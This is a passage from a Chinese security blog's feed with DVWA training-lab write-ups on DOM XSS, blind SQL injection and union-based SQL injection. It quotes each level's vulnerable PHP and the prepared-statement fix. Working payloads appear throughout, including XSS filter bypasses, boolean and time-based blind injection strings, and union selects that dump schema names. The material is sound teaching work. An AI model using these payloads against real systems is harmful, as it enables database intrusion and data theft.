方法可返回某个指定的字符串值在字符串中首次出现的位置。<br>substring() 方法用于提取字符串中介于两个指定下标之间的字符。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.write(&quot;&lt;option value=&apos;&quot; + lang + &quot;&apos;&gt;&quot; + decodeURI(lang) + &quot;&lt;/option&gt;&quot;);</span><br></pre></td></tr></table></figure></p><p>default=后面的参数变成了该语句中的lang,也就是：<br><code>&lt;option value=&quot;lang&quot;&gt;decodeURI(lang)&lt;/option&gt;</code></p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（五）XSS/20190326085520725.png" alt></p><p>同样可以闭合前面的option标签和select标签</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（五）XSS/20190326085530567.png" alt></p><h2 id="medium级别"><a href="#medium级别" class="headerlink" title="medium级别"></a>medium级别</h2><p><strong>PHP源码</strong>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// Is there any input?</span><br><span class="line">if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &apos;default&apos; ]) ) &#123;</span><br><span class="line">$default = $_GET[&apos;default&apos;];</span><br><span class="line"># Do not allow script tags</span><br><span class="line">if (stripos ($default, &quot;&lt;script&quot;) !== false) &#123;</span><br><span class="line">header (&quot;location: ?default=English&quot;);</span><br><span class="line">exit;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>stripos,查找 “第二个参数” 在第一个参数中第一次出现的位置。<br>也就是说过滤了<code>&lt;script</code></p><p><strong>绕过方法1</strong>：<br>url中有一个字符为#，该字符后的数据不会发送到服务器端，从而绕过服务端过滤，构造连接为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">default=&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（五）XSS/20190326085741861.png" alt></p><p><strong>绕过方法2</strong>：</p><p>用img，iframe，body，svg等标签的特性去执行JS代码。</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（五）XSS/20190326085753972.png" alt></p><h2 id="high级别"><a href="#high级别" class="headerlink" title="high级别"></a>high级别</h2><p><strong>源码</strong>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// Is there any input?</span><br><span class="line">if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &apos;default&apos; ]) ) &#123;</span><br><span class="line"></span><br><span class="line"># White list the allowable languages</span><br><span class="line">switch ($_GET[&apos;default&apos;]) &#123;</span><br><span class="line">case &quot;French&quot;:</span><br><span class="line">case &quot;English&quot;:</span><br><span class="line">case &quot;German&quot;:</span><br><span class="line">case &quot;Spanish&quot;:</span><br><span class="line"># ok</span><br><span class="line">break;</span><br><span class="line">default:</span><br><span class="line">header (&quot;location: ?default=English&quot;);</span><br><span class="line">exit;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>限定了键名必须为default，键值必须为固定的4个值。</p><p>所以这里只能用#绕过服务器检测</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（五）XSS/20190326090041546.png" alt></p><h2 id="impossible级别-1"><a href="#impossible级别-1" class="headerlink" title="impossible级别"></a>impossible级别</h2><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（五）XSS/20190326090325140.png" alt></p><p>把decodeuri变成了一个简单的括号，js是从URL中获得的lang参数并不会对他进行解码。所以无法构造XSS代码。</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（五）XSS/20190326090332523.png" alt></p><p>介绍：仅供技术交流学习探讨，请勿用于非法用途。本文部分资源来源于网络，如有侵权请联系版主删除。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;引言&quot;&gt;&lt;a href=&quot;#引言&quot; class=&quot;headerlink&quot; title=&quot;引言&quot;&gt;&lt;/a&gt;引言&lt;/h1&gt;&lt;p&gt;DVWA学习（五）XSS&lt;br&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://archimesan.me/categories/CTF/"/>
    
      <category term="DVWA" scheme="http://archimesan.me/categories/CTF/DVWA/"/>
    
    
      <category term="DVWA" scheme="http://archimesan.me/tags/DVWA/"/>
    
  </entry>
  
  <entry>
    <title>DVWA学习（四）SQL Injection（Blind）</title>
    <link href="http://archimesan.me/2018/05/15/DVWA%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%9B%9B%EF%BC%89SQL-Injection%EF%BC%88Blind%EF%BC%89/"/>
    <id>http://archimesan.me/2018/05/15/DVWA学习（四）SQL-Injection（Blind）/</id>
    <published>2018-05-15T11:53:28.000Z</published>
    <updated>2019-03-27T01:11:24.268Z</updated>
    
    <content type="html"><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>DVWA学习（四）SQL Injection（Blind）<br><a id="more"></a></p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>盲注就是在sql注入过程中，sql语句执行的选择后，选择的数据不能回显到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。</p><p>盲注分为三类：<br>•基于布尔SQL盲注<br>•基于时间的SQL盲注<br>•基于报错的SQL盲注</p><p>构造payload让信息通过错误提示回显出来</p><h2 id="LOW级别"><a href="#LOW级别" class="headerlink" title="LOW级别"></a>LOW级别</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">id=1-5 显示 User ID exists in the database.</span><br><span class="line">id=1&apos; 或者大于5显示 User ID is MISSING from the database</span><br><span class="line">id=1&apos; or 1=&apos;1 显示 User ID exists in the database.</span><br><span class="line">id=1 or 1=1 显示 User ID exists in the database.</span><br><span class="line">id=1&apos; and &apos;1&apos;=&apos;0 显示 User ID is MISSING from the database.</span><br><span class="line">id=1&apos; and &apos;1&apos;=&apos;1 显示 User ID exists in the database.</span><br><span class="line">id=1 and 1=0 显示 User ID exists in the database.</span><br></pre></td></tr></table></figure><p><strong>可以判断为单引号闭合</strong></p><p>1.对ascii值爆破的方法：<br>输入<code>1&#39; and length(database())=4 %23</code>，显示存在，所以数据库名为4个字符长度。<br><code>id=1&#39; and if(ascii(substr((select database()),1,1))=100,1,0)%23&amp;Submit=Submit显示User ID exists in the database</code>.说明数据库名第一个字母ascii为100，即d。同理可以知道数据库名为<code>dvwa</code>。</p><p><strong>表的数量</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=1&apos; and (select count (table_name) from information_schema.tables where table_schema=database())=1 %23 显示不存在</span><br><span class="line"></span><br><span class="line">id=1&apos; and (select count (table_name) from information_schema.tables where table_schema=database())=2 %23 显示存在</span><br></pre></td></tr></table></figure></p><p><code>id=1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=103 %23</code><br>显示<code>User ID exists in the database</code>.说明第一个数据表的第一个字母ascii为103，同理可以得到这个表的名字和下一个表users的名字。</p><p>2.手动二分法猜解</p><p><strong>库名</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">id=1&apos; and ascii(substr(databse(),1,1))&gt;97 %23 ，显示存在，说明数据库名的第一个字符的ascii值大于97（小写字母a的ascii值）；</span><br><span class="line"></span><br><span class="line">id=1&apos; and ascii(substr(databse(),1,1))&lt;122 %23，显示存在，说明数据库名的第一个字符的ascii值小于122（小写字母z的ascii值）；</span><br><span class="line"></span><br><span class="line">id=1&apos; and ascii(substr(databse(),1,1))&lt;109 %23，显示存在，说明数据库名的第一个字符的ascii值小于109（小写字母m的ascii值）；</span><br><span class="line"></span><br><span class="line">id=1&apos; and ascii(substr(databse(),1,1))&lt;103 %23，显示存在，说明数据库名的第一个字符的ascii值小于103（小写字母g的ascii值）；</span><br><span class="line"></span><br><span class="line">id=1&apos; and ascii(substr(databse(),1,1))&lt;100 %23，显示不存在，说明数据库名的第一个字符的ascii值不小于100（小写字母d的ascii值）；</span><br><span class="line"></span><br><span class="line">id=1&apos; and ascii(substr(databse(),1,1))&gt;100 %23，显示不存在，说明数据库名的第一个字符的ascii值不大于100（小写字母d的ascii值），所以数据库名的第一个字符的ascii值为100，即小写字母d。</span><br></pre></td></tr></table></figure></p><p><strong>表名</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">id=1&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;97 %23 显示存在</span><br><span class="line"></span><br><span class="line">id=1&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;122 %23 显示存在</span><br><span class="line"></span><br><span class="line">id=1&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;109 %23 显示存在</span><br><span class="line"></span><br><span class="line">id=1&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;103 %23 显示不存在</span><br><span class="line"></span><br><span class="line">id=1&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;103 %23 显示不存在</span><br></pre></td></tr></table></figure></p><p>3.基于时间的盲注</p><p><code>id=1&#39; and sleep(5)%23</code> 有延迟<br><code>id=1 and sleep(5)%23</code> 没有延迟<br>说明存在字符型的基于时间的盲注。</p><p><strong>猜数据库名的长度</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=1&apos; and if(length(database())=1,sleep(5),1)%23 没有延迟</span><br><span class="line">id=1&apos; and if(length(database())=4,sleep(5),1)%23 有延迟</span><br></pre></td></tr></table></figure></p><p>说明库名长度为4</p><p><strong>二分法猜解库名</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">id=1&apos; and if(ascii(substr(database(),1,1))&gt;97,sleep(5),1)%23有延迟</span><br><span class="line">···</span><br><span class="line">1&apos; and if(ascii(substr(database(),1,1))&lt;100,sleep(5),1)# 没有延迟</span><br><span class="line"></span><br><span class="line">1&apos; and if(ascii(substr(database(),1,1))&gt;100,sleep(5),1)# 没有延迟</span><br></pre></td></tr></table></figure></p><p>库名第一个字母ascii为100</p><p>同理可以猜出表的个数 长度 名字以及列和数据。</p><p><strong>源码：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( isset( $_GET[ &apos;Submit&apos; ] ) ) &#123;</span><br><span class="line">// Get input</span><br><span class="line">$id = $_GET[ &apos;id&apos; ];</span><br><span class="line"></span><br><span class="line">// Check database</span><br><span class="line">$getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos;;&quot;;</span><br><span class="line">$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $getid ); // Removed &apos;or die&apos; to suppress mysql errors</span><br><span class="line"></span><br><span class="line">// Get results</span><br><span class="line">$num = @mysqli_num_rows( $result ); // The &apos;@&apos; character suppresses errors</span><br><span class="line">if( $num &gt; 0 ) &#123;</span><br><span class="line">// Feedback for end user</span><br><span class="line">echo &apos;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">// User wasn&apos;t found, so the page wasn&apos;t!</span><br><span class="line">header( $_SERVER[ &apos;SERVER_PROTOCOL&apos; ] . &apos; 404 Not Found&apos; );</span><br><span class="line"></span><br><span class="line">// Feedback for end user</span><br><span class="line">echo &apos;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>根据源码，发现id没有经过任何过滤就被放入sql语句。如果查询返回的结果数大于0就显示<code>&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;</code>，否则<code>&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;</code></p><h2 id="Medium难度"><a href="#Medium难度" class="headerlink" title="Medium难度"></a>Medium难度</h2><p>变成了下拉选项，查看源码参数名为id且为post方式。hackbar或者burp抓包改参数即可</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（四）SQL-Injection（Blind）/20190326080731815.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=1&apos; and 1=1报错</span><br><span class="line">id=1 and 1=1正确</span><br><span class="line">id=1 and 1=0报错</span><br></pre></td></tr></table></figure><p>说明为数字型。</p><p>其余方法和low难度大同小异</p><p><strong>布尔盲注：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">id=1 and length(database())=4 #，显示存在，说明数据库名的长度为4个字符；</span><br><span class="line"></span><br><span class="line">id=1 and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #，显示存在，说明数据中的第一个表名长度为9个字符；</span><br><span class="line"></span><br><span class="line">id=1 and (select count(column_name) from information_schema.columns where table_name= 0×7573657273)=8 #，（0×7573657273为users的16进制），显示存在，说明uers表有8个字段。</span><br></pre></td></tr></table></figure></p><p><strong>时间盲注：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">id=1 and if(length(database())=4,sleep(5),1) #，明显延迟，说明数据库名的长度为4个字符；</span><br><span class="line"></span><br><span class="line">id=1 and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9,sleep(5),1) #，明显延迟，说明数据中的第一个表名长度为9个字符；</span><br><span class="line"></span><br><span class="line">id=1 and if((select count(column_name) from information_schema.columns where table_name=0×7573657273 )=8,sleep(5),1) #，明显延迟，说明uers表有8个字段。</span><br></pre></td></tr></table></figure></p><p><strong>源码：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( isset( $_POST[ &apos;Submit&apos; ] ) ) &#123;</span><br><span class="line">// Get input</span><br><span class="line">$id = $_POST[ &apos;id&apos; ];</span><br><span class="line">$id = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $id ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line"></span><br><span class="line">// Check database</span><br><span class="line">$getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;;</span><br><span class="line">$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $getid ); // Removed &apos;or die&apos; to suppress mysql errors</span><br><span class="line"></span><br><span class="line">// Get results</span><br><span class="line">$num = @mysqli_num_rows( $result ); // The &apos;@&apos; character suppresses errors</span><br><span class="line">if( $num &gt; 0 ) &#123;</span><br><span class="line">// Feedback for end user</span><br><span class="line">echo &apos;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">// Feedback for end user</span><br><span class="line">echo &apos;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//mysql_close();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>与low难度相比多了一个<code>mysqli_real_escape_string</code>函数转义，但是这里的参数是数字型，不需要单引号双引号去闭合，加不加这个函数效果一样。</p><h2 id="High难度"><a href="#High难度" class="headerlink" title="High难度"></a>High难度</h2><p>在另外一个页面填写参数结果显示到该页面。</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（四）SQL-Injection（Blind）/20190326080906073.png" alt><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">id=1&apos; and 1=1#正确</span><br><span class="line">id=1&apos; and 1=0#错误</span><br><span class="line">id=1 and 1=1#正确</span><br><span class="line">id=1 and 1=0#正确</span><br></pre></td></tr></table></figure></p><p>所以是单引号闭合</p><p>另外有时候显示错误的时候，页面会延迟一会。<br>所以智能用布尔盲注。方法与前两个难度大同小异。</p><p><strong>源码：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( isset( $_COOKIE[ &apos;id&apos; ] ) ) &#123;</span><br><span class="line">// Get input</span><br><span class="line">$id = $_COOKIE[ &apos;id&apos; ];</span><br><span class="line"></span><br><span class="line">// Check database</span><br><span class="line">$getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos; LIMIT 1;&quot;;</span><br><span class="line">$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $getid ); // Removed &apos;or die&apos; to suppress mysql errors</span><br><span class="line"></span><br><span class="line">// Get results</span><br><span class="line">$num = @mysqli_num_rows( $result ); // The &apos;@&apos; character suppresses errors</span><br><span class="line">if( $num &gt; 0 ) &#123;</span><br><span class="line">// Feedback for end user</span><br><span class="line">echo &apos;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">// Might sleep a random amount</span><br><span class="line">if( rand( 0, 5 ) == 3 ) &#123;</span><br><span class="line">sleep( rand( 2, 4 ) );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// User wasn&apos;t found, so the page wasn&apos;t!</span><br><span class="line">header( $_SERVER[ &apos;SERVER_PROTOCOL&apos; ] . &apos; 404 Not Found&apos; );</span><br><span class="line"></span><br><span class="line">// Feedback for end user</span><br><span class="line">echo &apos;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>用COOKIE传递参数id，并且没有任何过滤，SQL语句后面加了一个limit 1限制返回的结果数为1。<br>另外如果查询的结果数&lt;=0<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if( rand( 0, 5 ) == 3 )</span><br><span class="line">&#123;</span><br><span class="line">sleep( rand( 2, 4 ) );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>该代码的意思是，在0-5随机生成一个随机整数数，如果该随机数等于3，就执行sleep(2,4)随机延迟2到4秒。所以不能用时间盲注，只能用布尔盲注。不过如果把时间盲注响应时间延长一点也是可以判断的，但是会很麻烦.</p><h2 id="Impossible难度"><a href="#Impossible难度" class="headerlink" title="Impossible难度"></a>Impossible难度</h2><p><strong>源码</strong>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( isset( $_GET[ &apos;Submit&apos; ] ) ) &#123;</span><br><span class="line">// Check Anti-CSRF token</span><br><span class="line">checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; );</span><br><span class="line"></span><br><span class="line">// Get input</span><br><span class="line">$id = $_GET[ &apos;id&apos; ];</span><br><span class="line"></span><br><span class="line">// Was a number entered?</span><br><span class="line">if(is_numeric( $id )) &#123;</span><br><span class="line">// Check the database</span><br><span class="line">$data = $db-&gt;prepare( &apos;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&apos; );</span><br><span class="line">$data-&gt;bindParam( &apos;:id&apos;, $id, PDO::PARAM_INT );</span><br><span class="line">$data-&gt;execute();</span><br><span class="line"></span><br><span class="line">// Get results</span><br><span class="line">if( $data-&gt;rowCount() == 1 ) &#123;</span><br><span class="line">// Feedback for end user</span><br><span class="line">echo &apos;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">// User wasn&apos;t found, so the page wasn&apos;t!</span><br><span class="line">header( $_SERVER[ &apos;SERVER_PROTOCOL&apos; ] . &apos; 404 Not Found&apos; );</span><br><span class="line"></span><br><span class="line">// Feedback for end user</span><br><span class="line">echo &apos;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>加入token机制防止CSRF，仍然使用PDO预处理语句划清了数据与代码的界限，杜绝了SQL注入。</p><p>参考文献:<br><a href="https://www.freebuf.com/articles/web/120985.html" target="_blank" rel="noopener">新手指南：DVWA-1.9全级别教程之SQL Injection(Blind)</a></p><p>介绍：仅供技术交流学习探讨，请勿用于非法用途。本文部分资源来源于网络，如有侵权请联系版主删除。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;引言&quot;&gt;&lt;a href=&quot;#引言&quot; class=&quot;headerlink&quot; title=&quot;引言&quot;&gt;&lt;/a&gt;引言&lt;/h1&gt;&lt;p&gt;DVWA学习（四）SQL Injection（Blind）&lt;br&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://archimesan.me/categories/CTF/"/>
    
      <category term="DVWA" scheme="http://archimesan.me/categories/CTF/DVWA/"/>
    
    
      <category term="DVWA" scheme="http://archimesan.me/tags/DVWA/"/>
    
  </entry>
  
  <entry>
    <title>DVWA学习（三）SQL Injection</title>
    <link href="http://archimesan.me/2018/05/12/DVWA%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%89%EF%BC%89SQL-Injection/"/>
    <id>http://archimesan.me/2018/05/12/DVWA学习（三）SQL-Injection/</id>
    <published>2018-05-12T11:39:52.000Z</published>
    <updated>2019-03-26T15:18:40.357Z</updated>
    
    <content type="html"><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>DVWA学习（三）SQL Injection<br><a id="more"></a></p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>SQL Injection，即SQL注入，是指攻击者通过注入恶意的SQL命令，破坏SQL查询语句的结构，从而达到执行恶意SQL语句的目的。SQL注入漏洞的危害是巨大的，常常会导致整个数据库被“脱裤”，尽管如此，SQL注入仍是现在最常见的Web漏洞之一。</p><h2 id="LOW级别"><a href="#LOW级别" class="headerlink" title="LOW级别"></a>LOW级别</h2><p>输入1</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（三）SQL-Injection/20190326074136032.png" alt></p><p>输入1’报错，可以知道这里的ID是单引号闭合<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos;1&apos;&apos;&apos; at line 1</span><br></pre></td></tr></table></figure></p><p>输入1’ or 1=’1显示了所有姓名和ID，可以知道是用了while循环显示</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（三）SQL-Injection/20190326074205885.png" alt></p><p>输入<code>id=1&#39; union select 1-- k&amp;Submit=Submit</code>报错<code>The used SELECT statements have a different number of columns</code><br>输入<code>id=1&#39; union select 1,2-- k&amp;Submit=Submit</code>正常显示,1,2号位也正常显示出来</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（三）SQL-Injection/20190326074237759.png" alt></p><p><strong>爆数据库</strong></p><p><code>id=1&#39; union select 1,database()-- k&amp;Submit=Submit 2</code>号位显示数据库名为<code>dvwa</code></p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（三）SQL-Injection/20190326074306143.png" alt></p><p><strong>爆表</strong></p><p><code>id=1&#39; union select 1,group_concat(0x3e,table_name) from information_schema.tables where table_schema=&#39;dvwa&#39; -- k&amp;Submit=Submit</code></p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（三）SQL-Injection/20190326074326343.png" alt></p><p><strong>爆列</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&apos; union select 1,group_concat(0x3e,column_name) from information_schema.columns where table_schema=&apos;dvwa&apos; -- k&amp;Submit=Submit</span><br></pre></td></tr></table></figure><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（三）SQL-Injection/20190326074528570.png" alt></p><p><strong>爆出所有用户名和密码</strong></p><p><img 